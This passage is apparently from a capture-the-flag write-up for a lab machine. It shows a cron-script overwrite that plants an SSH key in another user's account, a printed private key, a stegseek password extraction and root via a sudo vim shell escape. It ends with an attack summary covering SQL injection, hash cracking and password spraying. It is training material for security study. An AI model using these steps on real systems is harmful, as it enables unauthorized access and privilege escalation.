|o+B   o S     = o|
|..o*   o o   . + |
|*=E o   . + .    |
|=B . .     + .   |
|+.  .      .+    |
+----[SHA256]-----+
pedro@b8168e4d1ebc:~$ cat ./valentina_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOWo/UZndbFHCcK+oLA6HarnbiC/2Mdct/d7VaiWKX5 pedro@b8168e4d1ebc
pedro@b8168e4d1ebc:~$ cat > /opt/log_cleaner.sh << 'EOF'
> #!/bin/bash
> mkdir -p /home/valentina/.ssh
> echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOWo/UZndbFHCcK+oLA6HarnbiC/2Mdct/d7VaiWKX5 pedro@b8168e4d1ebc" >> /home/valentina/.ssh/authorized_keys
> chmod 700 /home/valentina/.ssh
> chmod 600 /home/valentina/.ssh/authorized_keys
> chown -R valentina:valentina /home/valentina/.ssh
> EOF
```

**16. Connecting as valentina After the Cron Fires**

Once the cron executed the overwritten script and injected the key, SSH access to `valentina` was established using the private key.

```bash
pedro@b8168e4d1ebc:~$ ssh -i valentina_key -o StrictHostKeyChecking=no valentina@127.0.0.1
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Linux b8168e4d1ebc 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
valentina@b8168e4d1ebc:~$ id;whoami;hostname
uid=1001(valentina) gid=1001(valentina) groups=1001(valentina)
valentina
b8168e4d1ebc
```

**17. Retrieving valentina's Flag and Noting the Profile Picture**

```bash
valentina@b8168e4d1ebc:~$ ls -la
total 76
drwxrwx--- 1 valentina valentina  4096 Jul 30 01:36 .
drwxr-xr-x 1 root      root       4096 Feb 10  2025 ..
-rw-r--r-- 1 valentina valentina   220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 valentina valentina  3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 valentina valentina   807 Mar 29  2024 .profile
drwx------ 2 valentina valentina  4096 Jul 30 01:36 .ssh
-r-------- 1 valentina valentina   636 Feb  9  2025 fl4g.txt
-r-------- 1 valentina valentina 44990 Feb  9  2025 profile_picture.jpeg
valentina@b8168e4d1ebc:~$ cat fl4g.txt 
               ______
              '-._   ```"""---.._
           ,-----.:___           `\  ,;;;,
            '-.._     ```"""--.._  |,%%%%%%              _
            ,    '.              `\;;;;  -\      _    _.'/\
          .' `-.__ \            ,;;;;" .__{=====/_)==:_  ||
     ,===/        ```";,,,,,,,;;;;;'`-./.____,'/ /     '.\/ 
    '---/              ';;;;;;;;'      `--.._.' /
   ,===/                          '-.        `\/
  '---/                            ,'`.        |
     ;                        __.-'    \     ,'
jgs  \______,,.....------'''``          `---`


       ~ Ahora, a por la escalada de privilegios ~
```

The home directory contained `profile_picture.jpeg` alongside the flag, a clear hint to investigate the image for hidden data.

---

## Privilege Escalation

### Steganography: Extracting the sudo Password from the Profile Picture

**18. Exfiltrating and Analysing the Profile Picture**

The private key was saved locally, permissions were set, and the image was exfiltrated via SCP. `stegseek` was run against it to extract any hidden content.

```bash
pedro@b8168e4d1ebc:~$ cat valentina_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBDlqP1GZ3WxRwnCvqCwOh2q524gv9jHXLf3e1Wolil+QAAAJj1tqtT9bar
UwAAAAtzc2gtZWQyNTUxOQAAACBDlqP1GZ3WxRwnCvqCwOh2q524gv9jHXLf3e1Wolil+Q
AAAEDZbW3tI48oKhpmk2UKegXmkt0PeRe32YT0nEkc8MT+8kOWo/UZndbFHCcK+oLA6Har
nbiC/2Mdct/d7VaiWKX5AAAAEnBlZHJvQGI4MTY4ZTRkMWViYwECAw==
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ vim valentina_key

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ chmod 600 valentina_key
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ scp -i valentina_key valentina@$ip:~/profile_picture.jpeg .
profile_picture.jpeg                                                                        100%   44KB  17.0MB/s   00:00    

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ open profile_picture.jpeg 

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ stegseek profile_picture.jpeg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "secret.txt".
[i] Extracting to "profile_picture.jpeg.out".


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ cat profile_picture.jpeg.out 
mag1ck
```

`stegseek` found no passphrase was needed and extracted `secret.txt` from the image. Its content was `mag1ck`.

### Escalating to Root via sudo vim

**19. Checking sudo Permissions and Escalating**

The password `mag1ck` was used to authenticate the `sudo -l` check for `valentina`, which revealed full `ALL` sudo access with `NOPASSWD` specifically for `vim`. The GTFOBins vim shell escape was applied immediately.

```bash
valentina@b8168e4d1ebc:~$ sudo -l
[sudo] password for valentina: 
Matching Defaults entries for valentina on b8168e4d1ebc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty,
    listpw=always

User valentina may run the following commands on b8168e4d1ebc:
    (ALL : ALL) PASSWD: ALL, NOPASSWD: /usr/bin/vim
```

```bash
valentina@b8168e4d1ebc:~$ sudo /usr/bin/vim -c ':!/bin/bash'

root@b8168e4d1ebc:/home/valentina# su -
root@b8168e4d1ebc:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
b8168e4d1ebc
root@b8168e4d1ebc:~# ls -la
total 24
drwx------ 1 root root 4096 Feb 10  2025 .
drwxr-xr-x 1 root root 4096 Jul 29 23:14 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Feb 10  2025 .ssh
-rw-r--r-- 1 root root  527 Feb  9  2025 fl4g.txt
root@b8168e4d1ebc:~# cat fl4g.txt 
 ,
     |\     ____
     \ \.-./ .-' T
      \ _  _( /| | |\
    ) | .)(./ |  |  |
      |   \(   \_|_/
  (   |     \    |
 )    |  \VvV    | (
      |  |\,,\   | 
    ) |  | ^^^   |    )
   (  |  |__     |   (
 )   /      `-. _|    )
(   /          /  `\
   /          ///_ |
  /jgs       (((-|'
              ``````|

  _, _, ,  ,  _,  ,_  _  ___,_,
 /  / \,|\\ | / _  |_)'|\' | (_,
'\\_'\\_/ |'\\'\_|`'| \\ |-\\ |  _)
   `'   '  `  _|  '  `'  `' '  
              '                 
Instagram: @purpl3_mag1ck
TikTok: @purple_mag1ck
```

The root flag was captured. The creator's social media handles embedded in the flag — `@purpl3_mag1ck` and `@purple_mag1ck` — tied the entire password narrative (`purpl3` and `mag1ck`) together as a signature of the machine author.

---

## Attack Chain Summary
1. **Reconnaissance**: Nmap identified SSH and Apache. Adding `gatekeeperhr.com` to `/etc/hosts` resolved the site. Feroxbuster discovered `/lab/employees.php` (a JSON employee list including two IT interns: Pedro Ramirez and Valentina Gomez) and `/lab/login.php` (a POST-only JSON API).
2. **Vulnerability Discovery**: Manual testing confirmed SQL injection in the `username` JSON field via a tautology bypass. Three sqlmap invocations enumerated databases, then tables (`employees`, `hr_users`), then dumped and cracked the MD5 hashes: `mariana:sunshine` and `jorge:qwerty`. ffuf subdomain fuzzing discovered `www.gatekeeperhr.com`, which visually disclosed the password `purpl3` for the intern accounts.
3. **Exploitation**: A loop of `sshpass` tests across username variants for the internship employees confirmed `pedro` as the valid account with the `purpl3` password. SSH access was established as `pedro`, and the first flag was captured.
4. **Internal Enumeration**: `/opt/log_cleaner.sh` was world-writable and executed by cron as `valentina`. An ED25519 key pair was generated, and the script was overwritten with a payload to inject the public key into `valentina`'s `authorized_keys`. After the cron fired, SSH access to `valentina` was established. Her home directory contained `profile_picture.jpeg`. `stegseek` extracted a hidden `secret.txt` with the content `mag1ck`.
5. **Privilege Escalation**: A `sudo -l` check for `valentina` with the password `mag1ck` revealed passwordless sudo access to `vim`. The GTFOBins vim shell escape (`sudo vim -c ':!/bin/bash'`) spawned a root shell. `su -` confirmed full root and the final flag was captured.
